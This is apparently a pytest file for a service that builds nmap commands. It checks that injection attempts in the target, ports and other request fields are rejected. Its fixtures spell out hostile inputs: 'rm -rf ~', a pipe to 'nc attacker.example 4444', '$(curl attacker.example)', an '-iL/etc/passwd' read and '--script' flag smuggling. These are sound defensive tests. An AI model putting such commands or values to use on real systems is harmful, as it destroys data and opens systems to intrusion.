import pytest
from pydantic import ValidationError

from app.core.exceptions import InvalidPortsError, InvalidScanRequestError, InvalidTargetError
from app.nmap.command_builder import build_command
from app.schemas.scan import ScanRequest

MALICIOUS_TARGETS = {
    "command-injection-semicolon": "127.0.0.1; rm -rf ~",
    "command-injection-pipe": "127.0.0.1 | nc attacker.example 4444",
    "command-substitution": "$(curl attacker.example)",
    "backticks": "`id`",
    "argument-injection-script": "--script=http-brute",
    "argument-injection-input-list": "-iL/etc/passwd",
    "extra-flags-after-target": "192.168.1.1 -oN /tmp/out",
    "newline": "192.168.1.1\n-sS",
    "null-byte": "192.168.1.1\x00-sS",
    "path-traversal": "../../etc/passwd",
    "url": "http://192.168.1.1/",
}

MALICIOUS_PORTS = {
    "command-injection": "22; rm -rf ~",
    "extra-flag": "22 --script=vuln",
    "trailing-newline": "22\n",
    "arabic-indic-digits": "٢٢",
    "fullwidth-digits": "２２",
    "protocol-prefix": "T:22,U:53",
}


@pytest.mark.parametrize("target", MALICIOUS_TARGETS.values(), ids=MALICIOUS_TARGETS.keys())
def test_malicious_targets_never_reach_the_command(target):
    with pytest.raises(InvalidTargetError):
        build_command(ScanRequest(target=target), is_root=True)


@pytest.mark.parametrize("ports", MALICIOUS_PORTS.values(), ids=MALICIOUS_PORTS.keys())
def test_malicious_ports_never_reach_the_command(ports):
    with pytest.raises(InvalidPortsError):
        build_command(ScanRequest(target="192.168.1.1", ports=ports), is_root=True)


@pytest.mark.parametrize(
    "field, value",
    [
        ("scan_type", "-sS --script=vuln"),
        ("timing", "4 --script=vuln"),
        ("extra_args", ["--script=vuln"]),
        ("nmap_path", "/bin/sh"),
    ],
)
def test_raw_flags_cannot_be_smuggled_through_other_fields(field, value):
    with pytest.raises(ValidationError):
        ScanRequest(target="192.168.1.1", **{field: value})


def test_all_request_errors_are_one_catchable_type():
    for target in MALICIOUS_TARGETS.values():
        with pytest.raises(InvalidScanRequestError):
            build_command(ScanRequest(target=target), is_root=True)
